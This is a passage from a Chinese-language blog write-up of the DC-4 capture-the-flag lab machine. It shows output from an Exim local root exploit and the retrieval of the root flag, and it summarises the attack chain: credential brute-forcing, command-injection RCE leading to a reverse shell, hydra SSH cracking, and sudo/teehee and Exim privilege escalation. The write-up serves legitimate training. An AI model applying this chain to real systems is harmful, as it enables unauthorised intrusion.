setuid payload...</span><br><span class="line">220 dc-4 ESMTP Exim 4.89 Tue, 13 Sep 2022 17:26:04 +1000</span><br><span class="line">250 dc-4 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with &quot;.&quot; on a line by itself</span><br><span class="line">250 OK id=1oY0J2-0000EC-7b</span><br><span class="line">221 dc-4 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">-rwsr-xr-x 1 root jim 7500 Sep 13 17:26 /tmp/pwned</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="查找flag"><a href="#查找flag" class="headerlink" title="查找flag"></a>查找flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@dc-4:/home/charles# find / -name &quot;*flag*.txt&quot;</span><br><span class="line">/root/flag.txt</span><br><span class="line">root@dc-4:/home/charles# cat /root/flag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
+<h2 id="Sum-up"><a href="#Sum-up" class="headerlink" title="Sum-up"></a>Sum-up</h2><p>扫描端口发现80,22</p>
+<p>通过爆破获取web用户名密码</p>
+<p>Commond页面存在RCE-&gt;反弹shell</p>
+<p>/home/jim 下存在jim的passwd备份文件-&gt;hydra爆破-&gt;登录到jim</p>
+<p>1)通过mail找到Charles的密码-&gt;登录到Charles-&gt;sudo -l-&gt;teehee编辑器提权</p>
+<p>2)通过查找可用SUID提权方式-&gt;exim4提权</p>
+<p>find(root权限)查找flag文件</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/Targetplane/Earth/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-09-13 11:11:11
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/WirteUp/" title="WirteUp">
+                        <b>#</b> WirteUp
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC4-%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95"><span class="toc-text">DC4 靶机记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%9F%A5%E7%9C%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">nmap查看信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0command-php%E5%AD%98%E5%9C%A8RCE"><span class="toc-text">发现command.php存在RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E7%AB%AF%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-text">攻击机端监听端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E8%BF%9E%E6%8E%A5"><span class="toc-text">成功连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-text">查看当前权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ls%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-text">使用ls查看当前目录信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEpasswd%E6%96%87%E4%BB%B6%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A8%E5%A4%9A%E4%B8%AA%E7%94%A8%E6%88%B7"><span class="toc-text">访问passwd文件发现存在多个用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5home%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A83%E4%B8%AA%E7%94%A8%E6%88%B7"><span class="toc-text">进入home目录发现存在3个用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E8%BF%9B%E5%85%A53%E4%B8%AA%E7%94%A8%E6%88%B7%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0%E4%BB%85jim%E4%B8%AD%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6"><span class="toc-text">分别进入3个用户目录发现仅jim中存在文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5backups-%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A8%E5%AF%86%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toc-text">进入backups 发现存在密码备份文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8Cssh%E7%88%86%E7%A0%B4"><span class="toc-text">尝试使用获取到的文件进行ssh爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%88%86%E7%A0%B4%E5%88%B0%E5%AF%86%E7%A0%81"><span class="toc-text">成功爆破到密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8jim%E7%99%BB%E5%BD%95%E5%88%B0%E7%B3%BB%E7%BB%9F"><span class="toc-text">使用jim登录到系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95Charles%E7%94%A8%E6%88%B7"><span class="toc-text">登录Charles用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%831-teehee%E6%8F%90%E6%9D%83"><span class="toc-text">尝试提权1(teehee提权)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#teehee%E6%88%90%E5%8A%9F%E6%8F%90%E6%9D%83%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90"><span class="toc-text">teehee成功提权获得root权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%832-exim4%E6%8F%90%E6%9D%83"><span class="toc-text">尝试提权2(exim4提权)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8kali%E6%90%9C%E7%B4%A2exim-%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A8%E4%BB%A5%E4%B8%8B%E5%8F%AF%E5%88%A9%E7%94%A8"><span class="toc-text">使用kali搜索exim,发现存在以下可利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%B0%9D%E8%AF%9546996-sh%E5%8F%AF%E7%94%A8"><span class="toc-text">通过尝试46996.sh可用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%8F%90%E6%9D%83"><span class="toc-text">成功提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEflag"><span class="toc-text">查找flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sum-up"><span class="toc-text">Sum-up</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/17year">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
